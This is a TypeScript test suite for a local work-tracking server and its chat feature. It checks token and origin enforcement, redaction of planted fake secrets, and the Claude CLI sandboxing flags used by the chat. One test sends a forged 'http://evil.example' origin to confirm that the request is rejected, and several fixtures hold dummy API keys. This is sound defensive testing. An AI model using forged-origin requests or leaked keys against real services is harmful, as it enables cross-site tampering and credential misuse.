import { mock, test } from "node:test";
import assert from "node:assert/strict";
import { request } from "node:http";
import { cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Almacen } from "../src/central/almacen.ts";
import { crearCentral } from "../src/central/servidor.ts";
import { aplicarCambios, type Cambio } from "../src/cambios.ts";
import { nombreDeRepo, quitar, registrar } from "../src/repos.ts";
import { Chat } from "../src/chat.ts";
import { configPorDefecto, escribirConfig, rutasGlobales, type Config } from "../src/config.ts";
import { validarSnapshot } from "../src/contract/snapshot.ts";
import { aplicarYRecalcular, generarSnapshot, reposObservados, leerFuentes, recalcularConPlan, recalcularSiHayDaily } from "../src/daily.ts";
import { agregarEvento } from "../src/eventos.ts";
import { dirDeProyecto } from "../src/fuentes/claudeCode.ts";
import { hookSesion } from "../src/hooks.ts";
import type { Ejecutor } from "../src/llm/claudeCli.ts";
import { cmdPlan, confirmarPlan } from "../src/planCmd.ts";
import { guardarState } from "../src/state.ts";
import { FakeLlm } from "./helpers/fakeLlm.ts";
import { crearRepoRegistrado, type RepoTemporal } from "./helpers/repo.ts";

const LUN = "2026-10-05";
const CHAT_ID = "11111111-1111-4111-8111-111111111111";
const VIEJO_ID = "22222222-2222-4222-8222-222222222222";
const AHORA = new Date("2026-10-05T15:00:00Z");
const config: Config = configPorDefecto({ id: "denis", nombre: "Denis", equipo: "QA" });
const leer = (r: RepoTemporal, archivo: string): string => readFileSync(join(r.dir, ".rastro", archivo), "utf8");

/** Repo con plan vigente repartido, un commit de la semana y el state.json que dejaría `rastro daily`. */
async function repoPersonal(commitAsunto = "[Bitácora] primer registro"): Promise<RepoTemporal> {
  const r = crearRepoRegistrado();
  escribirConfig(config);
  registrar(r.dir);
  r.escribir(
    ".rastro/plan.sugerido.md",
    ["## Plan semana 05/10", "- **Entregable del viernes:** Demo.", "- [ ] **Bitácora:** Registrar el día. · 2d", "- [ ] **Central:** Recibir snapshots. · 4h", "- [ ] **Docs:** Escribir el README. · 1d", ""].join("\n"),
  );
  r.commit(commitAsunto, "2026-10-05T12:00:00Z");
  confirmarPlan({ config, hoy: LUN });
  const { snapshot } = await generarSnapshot({ repos: reposObservados(), config, llm: null, ahora: AHORA });
  guardarState(snapshot);
  return r;
}

type Llamada = { args: readonly string[]; entrada: string; cwd: string | undefined };
type Falso = { ejecutar: Ejecutor; llamadas: Llamada[] };

function ejecutorFalso(respuesta: () => Promise<{ codigo: number | null; stdout: string; stderr: string }>): Falso {
  const llamadas: Llamada[] = [];
  return {
    llamadas,
    ejecutar: (_bin, args, entrada, _timeout, cwd) => {
      llamadas.push({ args, entrada, cwd });
      return respuesta();
    },
  };
}

const salida = (respuesta: string, cambios: unknown[] = []) => ({ codigo: 0, stdout: JSON.stringify({ is_error: false, structured_output: { respuesta, cambios } }), stderr: "" });

async function levantar(repo: RepoTemporal | null, ejecutar?: Ejecutor, horaDaily?: () => Promise<string | null>) {
  const servidor = crearCentral({
    almacen: new Almacen(mkdtempSync(join(tmpdir(), "rastro-central-"))),
    estaticos: join(tmpdir(), "rastro-sin-dist"),
    ...(repo === null ? {} : { personal: { ahora: () => AHORA, ...(ejecutar === undefined ? {} : { ejecutar }), ...(horaDaily === undefined ? {} : { horaDaily }) } }),
  });
  await new Promise<void>((resolve) => servidor.listen(0, "127.0.0.1", resolve));
  const { port } = servidor.address() as AddressInfo;
  const url = `http://127.0.0.1:${port}`;
  const token = repo === null ? "" : ((await (await fetch(`${url}/api/sesion`)).json()) as { token: string }).token;
  const post = (ruta: string, cuerpo: unknown, headers: Record<string, string> = {}) =>
    fetch(`${url}${ruta}`, { method: "POST", headers: { "content-type": "application/json", "x-rastro-token": token, ...headers }, body: JSON.stringify(cuerpo) });
  return { url, port, token, post, cerrar: () => new Promise<void>((resolve) => servidor.close(() => resolve())) };
}

/** Contenido de todo lo que hay bajo el repo, salvo .git: sirve para probar que algo no escribió nada. */
function foto(dir: string): Record<string, string> {
  const res: Record<string, string> = {};
  const recorrer = (d: string): void => {
    for (const nombre of readdirSync(d)) {
      if (nombre === ".git") continue;
      const ruta = join(d, nombre);
      if (statSync(ruta).isDirectory()) recorrer(ruta);
      else res[ruta] = readFileSync(ruta, "utf8");
    }
  };
  recorrer(dir);
  return res;
}

const duracionBitacora: Cambio = { tipo: "duracion", tarea: "bitacora", duracion: { valor: 1, unidad: "d" } };

test("sin --personal los endpoints nuevos dan 404 y /api/sesion dice que no es personal", async (t) => {
  const c = await levantar(null);
  t.after(c.cerrar);
  assert.deepEqual(await (await fetch(`${c.url}/api/sesion`)).json(), { personal: false });
  assert.equal((await fetch(`${c.url}/api/chat`)).status, 404);
  for (const ruta of ["/api/cambios", "/api/chat"]) {
    const res = await fetch(`${c.url}${ruta}`, { method: "POST", headers: { "content-type": "application/json" }, body: "{}" });
    assert.equal(res.status, 404, ruta);
  }
});

test("/api/sesion entrega persona, carpeta global, los repos registrados y un token de 32 bytes en hex", async (t) => {
  const r = await repoPersonal();
  const c = await levantar(r);
  t.after(c.cerrar);
  const s = (await (await fetch(`${c.url}/api/sesion`)).json()) as { personal: boolean; persona: unknown; dir: string; repos: string[]; token: string };
  assert.equal(s.personal, true);
  assert.deepEqual(s.persona, config.persona);
  assert.equal(s.dir, rutasGlobales().dir);
  assert.deepEqual(s.repos, [nombreDeRepo(r.dir)]);
  assert.match(s.token, /^[0-9a-f]{64}$/);
});

test("los POST del modo personal exigen token, origen propio y JSON", async (t) => {
  const r = await repoPersonal();
  const c = await levantar(r);
  t.after(c.cerrar);
  const antes = foto(r.dir);
  const cuerpo = { cambios: [duracionBitacora], confirmar: true };
  assert.equal((await c.post("/api/cambios", cuerpo, { "x-rastro-token": "" })).status, 403);
  assert.equal((await c.post("/api/cambios", cuerpo, { "x-rastro-token": "0".repeat(64) })).status, 403);
  assert.equal((await c.post("/api/cambios", cuerpo, { origin: "http://evil.example" })).status, 403);
  assert.equal((await c.post("/api/cambios", cuerpo, { origin: "null" })).status, 403);
  assert.equal((await c.post("/api/cambios", cuerpo, { "content-type": "text/plain" })).status, 403);
  assert.equal((await c.post("/api/cambios", cuerpo, { origin: `http://localhost:${c.port}` })).status, 200);
  assert.notDeepEqual(foto(r.dir), antes);
  // Los rechazados no tocaron nada: los dos primeros cambios válidos recién se aplican con el último pedido.
  assert.equal(readFileSync(join(r.dir, ".rastro/plan.md"), "utf8").includes("Registrar el día. · 1d"), true);
});

test("/api/cambios sin confirmar no escribe ningún archivo", async (t) => {
  const r = await repoPersonal();
  const c = await levantar(r);
  t.after(c.cerrar);
  const antes = foto(r.dir);
  const res = await c.post("/api/cambios", { cambios: [duracionBitacora], confirmar: false });
  const cuerpo = (await res.json()) as { vistaPrevia: string[]; aplicado: boolean };
  assert.equal(cuerpo.aplicado, false);
  assert.match(cuerpo.vistaPrevia.join("\n"), /Bitácora/);
  assert.deepEqual(foto(r.dir), antes);
});

test("/api/cambios confirmado cambia plan.md y recalcula state.json sin LLM, igual que `plan cambiar`", async (t) => {
  const r = await repoPersonal();
  const gemelo = await repoPersonal();
  cpSync(join(r.dir, ".rastro/plan.md"), join(gemelo.dir, ".rastro/plan.md"));
  // Cada repo de test trae su propia carpeta global: el central de `r` y el gemelo tienen que mirar la suya.
  const homeDe = (repo: RepoTemporal): void => void (process.env["RASTRO_HOME"] = join(repo.dir, ".rastro"));
  homeDe(r);
  const f = ejecutorFalso(async () => salida("no debería llamarse"));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  const cambios: Cambio[] = [duracionBitacora, { tipo: "dia", tarea: "central", dias: ["2026-10-08"] }];
  const res = await c.post("/api/cambios", { cambios, confirmar: true });
  assert.equal(((await res.json()) as { aplicado: boolean }).aplicado, true);
  homeDe(gemelo);
  aplicarCambios({ repos: [gemelo.dir], config, cambios, destino: "vigente", confirmar: true, hoy: LUN });
  assert.equal(leer(r, "plan.md"), leer(gemelo, "plan.md"));
  homeDe(r);
  const state = validarSnapshot(JSON.parse(leer(r, "state.json")));
  const bitacora = state.plan?.tareas.find((t) => t.slug === "bitacora");
  assert.deepEqual(bitacora?.duracion, { valor: 1, unidad: "d" });
  assert.deepEqual(state.plan?.tareas.find((t) => t.slug === "central")?.dias, ["2026-10-08"]);
  const barra = state.gantt.barras.find((b) => b.tarea === "central");
  assert.deepEqual(barra?.plan, { desde: "2026-10-08", hasta: "2026-10-08" });
  assert.equal(f.llamadas.length, 0);
});

test("/api/cambios con un cambio inválido da 400 y no toca nada", async (t) => {
  const r = await repoPersonal();
  const c = await levantar(r);
  t.after(c.cerrar);
  const antes = foto(r.dir);
  const res = await c.post("/api/cambios", { cambios: [{ tipo: "inventado" }], confirmar: true });
  assert.equal(res.status, 400);
  assert.deepEqual(foto(r.dir), antes);
});

test("/api/persona/<yo> sirve state.json redactado y /api/equipo incluye la fila", async (t) => {
  const r = await repoPersonal("Fix con API_KEY=supersecreto123 en el entorno");
  const c = await levantar(r);
  t.after(c.cerrar);
  assert.match(leer(r, "state.json"), /supersecreto123/);
  const res = await fetch(`${c.url}/api/persona/denis`);
  assert.equal(res.status, 200);
  const texto = await res.text();
  assert.doesNotMatch(texto, /supersecreto123/);
  assert.match(texto, /\[redactado\]/);
  const equipo = (await (await fetch(`${c.url}/api/equipo`)).json()) as { equipo: { persona: { id: string } }[] };
  assert.deepEqual(equipo.equipo.map((f) => f.persona.id), ["denis"]);
});

test("sin state.json, /api/persona/<yo> marca sinDaily con el plan de plan.md y la hora del próximo daily; otro id sigue dando 404", async (t) => {
  const r = crearRepoRegistrado();
  escribirConfig(config);
  writeFileSync(rutasGlobales().plan, ["## Plan semana 05/10", "- **Entregable del viernes:** Demo.", "- [ ] **Bitácora:** Registrar el día. · 2d", ""].join("\n"));
  const c = await levantar(r, undefined, () => Promise.resolve("18:30"));
  t.after(c.cerrar);
  const res = await fetch(`${c.url}/api/persona/denis`);
  assert.equal(res.status, 200);
  const cuerpo = (await res.json()) as { sinDaily: unknown; snapshot: unknown };
  assert.deepEqual(cuerpo.sinDaily, { proximoDaily: "18:30" });
  const snapshot = validarSnapshot(cuerpo.snapshot);
  assert.deepEqual(snapshot.plan?.tareas.map((t) => [t.slug, t.nombre]), [["bitacora", "Bitácora"]]);
  assert.deepEqual([snapshot.bitacora, snapshot.persona.id], [[], "denis"]);
  assert.equal((await fetch(`${c.url}/api/persona/otra`)).status, 404);
  assert.deepEqual(((await (await fetch(`${c.url}/api/equipo`)).json()) as { equipo: unknown[] }).equipo, []);
});

test("sin state.json ni plan.md ni programador, sinDaily llega sin plan y sin hora", async (t) => {
  const r = crearRepoRegistrado();
  escribirConfig(config);
  const c = await levantar(r);
  t.after(c.cerrar);
  const cuerpo = (await (await fetch(`${c.url}/api/persona/denis`)).json()) as { sinDaily: unknown; snapshot: unknown };
  assert.deepEqual(cuerpo.sinDaily, { proximoDaily: null });
  assert.equal(validarSnapshot(cuerpo.snapshot).plan, null);
});

test("el chat abre la sesión con --session-id, la retoma con --resume y ofrece el comando para la terminal", async (t) => {
  const r = await repoPersonal();
  const f = ejecutorFalso(async () => salida("Dale."));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  assert.equal(await (await fetch(`${c.url}/api/chat`)).json(), null);
  assert.equal((await c.post("/api/chat", { mensaje: "¿Cómo voy?" })).status, 200);
  assert.equal((await c.post("/api/chat", { mensaje: "¿Y mañana?" })).status, 200);
  const [primera, segunda] = f.llamadas;
  const idPrimera = primera?.args[primera.args.indexOf("--session-id") + 1];
  assert.match(idPrimera ?? "", /^[0-9a-f-]{36}$/);
  assert.equal(primera?.args.includes("--resume"), false);
  assert.equal(segunda?.args.includes("--session-id"), false);
  assert.equal(segunda?.args[(segunda?.args.indexOf("--resume") ?? -1) + 1], idPrimera);
  assert.deepEqual(JSON.parse(leer(r, "chat.json")), { semana: LUN, sessionId: idPrimera, historial: [idPrimera] });
  assert.deepEqual(await (await fetch(`${c.url}/api/chat`)).json(), { sessionId: idPrimera, retomar: `cd ${rutasGlobales().dir} && claude --resume ${idPrimera}` });
});

test("el chat corre en la carpeta global, sin herramientas y con la sesión persistida", async (t) => {
  const r = await repoPersonal("Fix con API_KEY=supersecreto123");
  const f = ejecutorFalso(async () => salida("Dale."));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  await c.post("/api/chat", { mensaje: "Hola" });
  const llamada = f.llamadas[0];
  assert.equal(llamada?.cwd, rutasGlobales().dir);
  const args = llamada?.args ?? [];
  assert.equal(args.includes("--no-session-persistence"), false);
  // Sin herramientas: no hay forma confiable de acotar Read/Grep/Glob al proyecto y negar secretos.
  assert.equal(args[args.indexOf("--tools") + 1], "");
  assert.equal(args.includes("--allowedTools"), false);
  assert.equal(args[args.indexOf("--permission-mode") + 1], "dontAsk");
  assert.equal(args[args.indexOf("--model") + 1], "sonnet");
  assert.ok(args.includes("--json-schema") && args.includes("--append-system-prompt"));
  for (const escritura of ["Bash", "Edit", "Write", "NotebookEdit"]) assert.equal(args.some((a) => a.includes(escritura)), false, escritura);
  assert.match(llamada?.entrada ?? "", /Registrar el día/);
  assert.doesNotMatch(llamada?.entrada ?? "", /supersecreto123/);
});

test("el chat nunca deja correr hooks: --restricted, hooks apagados y sin MCP", async (t) => {
  const r = await repoPersonal();
  const f = ejecutorFalso(async () => salida("Dale."));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  await c.post("/api/chat", { mensaje: "Hola" });
  await c.post("/api/chat", { mensaje: "Otra vez" });
  for (const llamada of f.llamadas) {
    assert.ok(llamada.args.includes("--restricted"));
    assert.ok(llamada.args.includes("--strict-mcp-config"));
    assert.equal(llamada.args[llamada.args.indexOf("--settings") + 1], '{"disableAllHooks":true}');
  }
});

test("cada mensaje lleva la fecha de hoy y el plan, también al retomar la sesión", async (t) => {
  const r = await repoPersonal();
  const f = ejecutorFalso(async () => salida("Dale."));
  let ahora = AHORA;
  const servidor = crearCentral({
    almacen: new Almacen(mkdtempSync(join(tmpdir(), "rastro-central-"))),
    estaticos: join(tmpdir(), "rastro-sin-dist"),
    personal: { ahora: () => ahora, ejecutar: f.ejecutar },
  });
  await new Promise<void>((resolve) => servidor.listen(0, "127.0.0.1", resolve));
  t.after(() => new Promise<void>((resolve) => servidor.close(() => resolve())));
  const url = `http://127.0.0.1:${(servidor.address() as AddressInfo).port}`;
  const { token } = (await (await fetch(`${url}/api/sesion`)).json()) as { token: string };
  const enviar = (mensaje: string) =>
    fetch(`${url}/api/chat`, { method: "POST", headers: { "content-type": "application/json", "x-rastro-token": token }, body: JSON.stringify({ mensaje }) });
  await enviar("Uno");
  ahora = new Date("2026-10-07T15:00:00Z");
  await enviar("Dos");
  assert.match(f.llamadas[0]?.entrada ?? "", /Hoy es 2026-10-05/);
  assert.match(f.llamadas[1]?.entrada ?? "", /Hoy es 2026-10-07/);
  assert.match(f.llamadas[1]?.entrada ?? "", /Registrar el día/);
  for (const llamada of f.llamadas) {
    const sistema = llamada.args[llamada.args.indexOf("--append-system-prompt") + 1] ?? "";
    assert.doesNotMatch(sistema, /2026-10/);
    assert.match(sistema, /misma sesión durante toda la semana/);
    assert.match(sistema, /te acordás de los mensajes anteriores/);
  }
});

test("si --resume falla porque la sesión ya no existe, abre una nueva y guarda la vieja en el historial", async (t) => {
  const r = await repoPersonal();
  let n = 0;
  const f = ejecutorFalso(async () => (++n === 2 ? { codigo: 1, stdout: "", stderr: "No conversation found with session ID: x" } : salida("Dale.")));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  await c.post("/api/chat", { mensaje: "Uno" });
  const viejo = (JSON.parse(leer(r, "chat.json")) as { sessionId: string }).sessionId;
  const res = await c.post("/api/chat", { mensaje: "Dos" });
  assert.equal(res.status, 200);
  assert.match(((await res.json()) as { aviso: string }).aviso, /empecé una nueva/);
  assert.equal(f.llamadas.length, 3);
  assert.ok(f.llamadas[1]?.args.includes("--resume"));
  assert.ok(f.llamadas[2]?.args.includes("--session-id"));
  const estado = JSON.parse(leer(r, "chat.json")) as { sessionId: string; historial: string[] };
  assert.notEqual(estado.sessionId, viejo);
  assert.deepEqual(estado.historial, [viejo, estado.sessionId]);
});

test("las sesiones del chat no cuentan como trabajo: ni prompts ni eventos de sesión", async (t) => {
  const r = await repoPersonal();
  const f = ejecutorFalso(async () => salida("Dale."));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  await c.post("/api/chat", { mensaje: "Hola" });
  const idChat = (JSON.parse(leer(r, "chat.json")) as { sessionId: string }).sessionId;
  const proyectos = mkdtempSync(join(tmpdir(), "rastro-proyectos-"));
  const dir = join(proyectos, dirDeProyecto(r.dir));
  mkdirSync(dir, { recursive: true });
  const linea = (sesion: string, texto: string) => JSON.stringify({ type: "user", message: { content: texto }, timestamp: AHORA.toISOString(), sessionId: sesion });
  writeFileSync(join(dir, `${idChat}.jsonl`), `${linea(idChat, "Plan vigente: lo del chat")}\n`);
  writeFileSync(join(dir, "otra-sesion.jsonl"), `${linea("otra-sesion", "Arreglá el parser")}\n`);
  const cfg: Config = { ...config, fuentes: { zshHistory: join(proyectos, "no-existe"), claudeProjects: proyectos } };
  const { prompts } = leerFuentes(cfg, r.dir, AHORA, []);
  assert.deepEqual(prompts.map((p) => p.texto), ["Arreglá el parser"]);

  const payload = (id: string) => JSON.stringify({ session_id: id, transcript_path: join(dir, `${id}.jsonl`), cwd: r.dir });
  hookSesion(payload(idChat), AHORA);
  assert.equal(existsSync(join(r.dir, ".rastro/events.jsonl")), false);
  hookSesion(payload("otra-sesion"), AHORA);
  assert.match(leer(r, "events.jsonl"), /otra-sesion/);
});

test("los cambios que el chat inventa y no se pueden aplicar se descartan logueando la posición original y nunca su texto", async (t) => {
  const r = await repoPersonal();
  const propuestos = [duracionBitacora, { tipo: "inventado-xyz" }, { tipo: "estado", tarea: "no-existe-xyz", estado: "hecha" }];
  const f = ejecutorFalso(async () => salida("Dale.", propuestos));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  const escrito: string[] = [];
  t.mock.method(process.stderr, "write", (x: string) => (escrito.push(x), true));
  await c.post("/api/chat", { mensaje: "Acortá Bitácora" });
  const descartes = escrito.filter((l) => l.includes("chat_cambio_descartado"));
  assert.equal(descartes.length, 2);
  // 1 lo descarta el validador del chat y 2 la vista previa del central: ambos hablan del índice en la lista del modelo.
  assert.match(descartes[0] ?? "", /posicion=1\b/);
  assert.match(descartes[1] ?? "", /posicion=2\b/);
  assert.doesNotMatch(escrito.join(""), /xyz/);
});

test("recalcularConPlan mide el atraso y el foco a la fecha del snapshot, no al día en que se recalcula", async () => {
  const r = await repoPersonal();
  const snapshot = validarSnapshot(JSON.parse(leer(r, "state.json")));
  assert.equal(snapshot.periodo.hasta, LUN);
  const recalculado = recalcularConPlan(snapshot, { config, hoy: "2026-10-09" });
  assert.deepEqual(recalculado.desvios.tareasAtrasadas, snapshot.desvios.tareasAtrasadas);
  assert.deepEqual(recalculado.foco, snapshot.foco);
  assert.deepEqual(recalculado.gantt.barras.map((b) => b.atrasada), snapshot.gantt.barras.map((b) => b.atrasada));
  assert.equal(recalculado.periodo.hasta, LUN);
});

test("el chat propone cambios con vista previa, no aplica ninguno y descarta los inválidos", async (t) => {
  const r = await repoPersonal();
  const propuestos = [duracionBitacora, { tipo: "inventado" }, { tipo: "estado", tarea: "no-existe", estado: "hecha" }];
  const f = ejecutorFalso(async () => salida("Te conviene acortarla.", propuestos));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  const antes = readFileSync(join(r.dir, ".rastro/plan.md"), "utf8");
  const res = await c.post("/api/chat", { mensaje: "Acortá Bitácora" });
  const cuerpo = (await res.json()) as { respuesta: string; cambios: Cambio[]; vistaPrevia: string[] };
  assert.equal(cuerpo.respuesta, "Te conviene acortarla.");
  assert.deepEqual(cuerpo.cambios, [duracionBitacora]);
  assert.match(cuerpo.vistaPrevia.join("\n"), /Bitácora/);
  assert.equal(readFileSync(join(r.dir, ".rastro/plan.md"), "utf8"), antes);
});

test("el chat acepta un cambio de repo, lo pasa a la vista previa y ofrece los repos registrados como opciones", async (t) => {
  const r = await repoPersonal();
  const nombre = nombreDeRepo(r.dir) ?? "";
  const cambio = { tipo: "repo", tarea: "central", repo: nombre };
  const f = ejecutorFalso(async () => salida("Esa tarea es de este repo.", [cambio]));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  const antes = readFileSync(join(r.dir, ".rastro/plan.md"), "utf8");
  const cuerpo = (await (await c.post("/api/chat", { mensaje: "Central va en este repo" })).json()) as { cambios: Cambio[]; vistaPrevia: string[] };
  assert.deepEqual(cuerpo.cambios, [cambio]);
  assert.match(cuerpo.vistaPrevia.join("\n"), new RegExp(`repo sin repo → ${nombre}`));
  assert.equal(readFileSync(join(r.dir, ".rastro/plan.md"), "utf8"), antes);
  const args = f.llamadas[0]?.args ?? [];
  const esquema = JSON.parse(args[args.indexOf("--json-schema") + 1] ?? "") as { properties: { cambios: { items: { properties: { repo: { enum: unknown[] } } } } } };
  assert.deepEqual(esquema.properties.cambios.items.properties.repo.enum, [nombre, null]);
  assert.match(args[args.indexOf("--append-system-prompt") + 1] ?? "", new RegExp(`tipo:'repo', tarea, repo:'${nombre}'\\|null`));
});

test("si ya no queda ningún repo observado, el chat responde con ese error en vez de descartar los cambios", async (t) => {
  const r = await repoPersonal();
  const f = ejecutorFalso(async () => salida("Dale.", [duracionBitacora]));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  quitar(r.dir);
  const res = await c.post("/api/chat", { mensaje: "Acortá Bitácora" });
  assert.equal(res.status, 400);
  assert.match(((await res.json()) as { error: string }).error, /No hay repos observados/);
  assert.equal(f.llamadas.length, 0);
});

test("el comando para retomar cita la carpeta global cuando tiene espacios", () => {
  const dir = join(mkdtempSync(join(tmpdir(), "rastro-chat-")), "mi carpeta");
  mkdirSync(dir);
  process.env["RASTRO_HOME"] = dir;
  writeFileSync(join(dir, "chat.json"), JSON.stringify({ semana: LUN, sessionId: CHAT_ID, historial: [CHAT_ID] }));
  assert.equal(new Chat().sesion(LUN)?.retomar, `cd '${dir}' && claude --resume ${CHAT_ID}`);
});

test("dos mensajes simultáneos: el segundo da 409", async (t) => {
  const r = await repoPersonal();
  let soltar: () => void = () => {};
  const f = ejecutorFalso(() => new Promise((resolve) => (soltar = () => resolve(salida("Listo.")))));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  const primero = c.post("/api/chat", { mensaje: "Uno" });
  while (f.llamadas.length === 0) await new Promise((resolve) => setTimeout(resolve, 5));
  assert.equal((await c.post("/api/chat", { mensaje: "Dos" })).status, 409);
  soltar();
  assert.equal((await primero).status, 200);
});

test("si claude falla el chat da 502 con un mensaje claro y no guarda la sesión", async (t) => {
  const r = await repoPersonal();
  const noInstalado = Object.assign(new Error("spawn claude ENOENT"), { code: "ENOENT" });
  const modos = [async () => Promise.reject(noInstalado), async () => ({ codigo: 1, stdout: "", stderr: "boom interno" }), async () => ({ codigo: 0, stdout: "no es json", stderr: "" })];
  for (const modo of modos) {
    const f = ejecutorFalso(modo);
    const c = await levantar(r, f.ejecutar);
    const res = await c.post("/api/chat", { mensaje: "Hola" });
    assert.equal(res.status, 502);
    const { error } = (await res.json()) as { error: string };
    assert.doesNotMatch(error, /boom|ENOENT|spawn/);
    assert.ok(error.length > 10);
    await c.cerrar();
  }
  // Ninguna llamada fallida deja una sesión retomable.
  const c = await levantar(r);
  t.after(c.cerrar);
  assert.equal(await (await fetch(`${c.url}/api/chat`)).json(), null);
});

test("el chat rechaza mensajes vacíos o de más de 4000 caracteres", async (t) => {
  const r = await repoPersonal();
  const f = ejecutorFalso(async () => salida("Dale."));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  assert.equal((await c.post("/api/chat", { mensaje: "" })).status, 400);
  assert.equal((await c.post("/api/chat", { mensaje: "x".repeat(4001) })).status, 400);
  assert.equal(f.llamadas.length, 0);
});

test("el modelo del chat sale de la config", async (t) => {
  const r = await repoPersonal();
  escribirConfig({ ...config, chat: { modelo: "opus" } });
  const f = ejecutorFalso(async () => salida("Dale."));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  await c.post("/api/chat", { mensaje: "Hola" });
  const args = f.llamadas[0]?.args ?? [];
  assert.equal(args[args.indexOf("--model") + 1], "opus");
});

test("--para-pegar usa state.json sin LLM ni regenerar", async () => {
  const r = await repoPersonal();
  const antes = leer(r, "state.json");
  const { cmdDaily } = await import("../src/daily.ts");
  const original = process.cwd();
  const escrito: string[] = [];
  const escribir = process.stdout.write;
  process.chdir(r.dir);
  process.stdout.write = ((t: string) => (escrito.push(t), true)) as typeof process.stdout.write;
  try {
    assert.equal(await cmdDaily(["--para-pegar"]), 0);
  } finally {
    process.stdout.write = escribir;
    process.chdir(original);
  }
  assert.match(escrito.join(""), /- \[Bitácora\] primer registro/);
  assert.equal(leer(r, "state.json"), antes);
});

test("--para-pegar redacta los secretos del texto antes de imprimirlo", async () => {
  const r = await repoPersonal("[Bitácora] probé con sk-abcdefghijklmnop123");
  const { cmdDaily } = await import("../src/daily.ts");
  const original = process.cwd();
  const escrito: string[] = [];
  const escribir = process.stdout.write;
  process.chdir(r.dir);
  process.stdout.write = ((t: string) => (escrito.push(t), true)) as typeof process.stdout.write;
  try {
    await cmdDaily(["--para-pegar"]);
  } finally {
    process.stdout.write = escribir;
    process.chdir(original);
  }
  assert.match(escrito.join(""), /probé con \[redactado\]/);
  assert.doesNotMatch(escrito.join(""), /sk-abc/);
});

test("--para-pegar sin state.json pide correr rastro daily", async () => {
  const r = crearRepoRegistrado();
  escribirConfig(config);
  const { cmdDaily } = await import("../src/daily.ts");
  const original = process.cwd();
  process.chdir(r.dir);
  try {
    await assert.rejects(cmdDaily(["--para-pegar"]), /rastro daily/);
  } finally {
    process.chdir(original);
  }
});

test("si el plan se aplicó pero state.json no se puede recalcular, responde 200 con un aviso", async (t) => {
  const r = await repoPersonal();
  writeFileSync(join(r.dir, ".rastro/state.json"), "{roto");
  const c = await levantar(r);
  t.after(c.cerrar);
  const res = await c.post("/api/cambios", { cambios: [duracionBitacora], confirmar: true });
  assert.equal(res.status, 200);
  const cuerpo = (await res.json()) as { aplicado: boolean; aviso: string };
  assert.equal(cuerpo.aplicado, true);
  assert.match(cuerpo.aviso, /rastro daily/);
  assert.match(leer(r, "plan.md"), /Registrar el día\. · 1d/);
});

test("un state.json roto: /api/equipo degrada sin la fila propia y /api/persona/<yo> da 409", async (t) => {
  const r = await repoPersonal();
  writeFileSync(join(r.dir, ".rastro/state.json"), "{roto");
  const c = await levantar(r);
  t.after(c.cerrar);
  const equipo = await fetch(`${c.url}/api/equipo`);
  assert.equal(equipo.status, 200);
  assert.deepEqual(((await equipo.json()) as { equipo: unknown[] }).equipo, []);
  const persona = await fetch(`${c.url}/api/persona/denis`);
  assert.equal(persona.status, 409);
  assert.match(((await persona.json()) as { error: string }).error, /rastro daily/);
});

test("corregir un vínculo recalcula la bitácora, el % fuera del plan y el Gantt real sin LLM", async (t) => {
  const r = await repoPersonal("trabajo suelto sin etiqueta");
  const antes = validarSnapshot(JSON.parse(leer(r, "state.json")));
  assert.equal(antes.desvios.fueraDelPlanPct, 100);
  const sha = r.git("rev-parse", "HEAD");
  const f = ejecutorFalso(async () => salida("no debería llamarse"));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  const cambio: Cambio = { tipo: "vinculo", commit: sha.slice(0, 7), tarea: "central" };
  assert.equal(((await (await c.post("/api/cambios", { cambios: [cambio], confirmar: true })).json()) as { aplicado: boolean }).aplicado, true);
  const despues = validarSnapshot(JSON.parse(leer(r, "state.json")));
  assert.equal(despues.desvios.fueraDelPlanPct, 0);
  const entrada = despues.bitacora.find((e) => e.evidencia.some((ev) => ev.ref === sha.slice(0, 7)));
  assert.deepEqual([entrada?.tarea, entrada?.vinculo], ["central", "corregido"]);
  assert.deepEqual(despues.gantt.barras.find((b) => b.tarea === "central")?.real, { desde: "2026-10-05", hasta: "2026-10-05" });
  assert.equal(despues.bitacora.find((e) => e.evidencia.some((ev) => ev.ref === sha.slice(0, 7)))?.texto, antes.bitacora[0]?.texto);
  assert.equal(f.llamadas.length, 0);
});

test("--resume con otro error (no autenticado) es un 502 con una sola invocación", async (t) => {
  const r = await repoPersonal();
  let n = 0;
  const f = ejecutorFalso(async () => (++n === 1 ? salida("Dale.") : { codigo: 1, stdout: "", stderr: "Not logged in" }));
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  await c.post("/api/chat", { mensaje: "Uno" });
  assert.equal((await c.post("/api/chat", { mensaje: "Dos" })).status, 502);
  assert.equal(f.llamadas.length, 2);
  assert.ok(f.llamadas[1]?.args.includes("--resume"));
});

test("si la sesión nueva tras una pérdida también falla, el mensaje siguiente no vuelve a intentar --resume", async (t) => {
  const r = await repoPersonal();
  let n = 0;
  const f = ejecutorFalso(async () => {
    n++;
    if (n === 1) return salida("Dale.");
    if (n === 2) return { codigo: 1, stdout: "", stderr: "No conversation found with session ID: x" };
    return n === 3 ? { codigo: 1, stdout: "", stderr: "caído" } : salida("Volví.");
  });
  const c = await levantar(r, f.ejecutar);
  t.after(c.cerrar);
  await c.post("/api/chat", { mensaje: "Uno" });
  assert.equal((await c.post("/api/chat", { mensaje: "Dos" })).status, 502);
  assert.equal((await c.post("/api/chat", { mensaje: "Tres" })).status, 200);
  assert.equal(f.llamadas.length, 4);
  assert.equal(f.llamadas[3]?.args.includes("--resume"), false);
  assert.equal((JSON.parse(leer(r, "chat.json")) as { historial: string[] }).historial.length, 3);
});

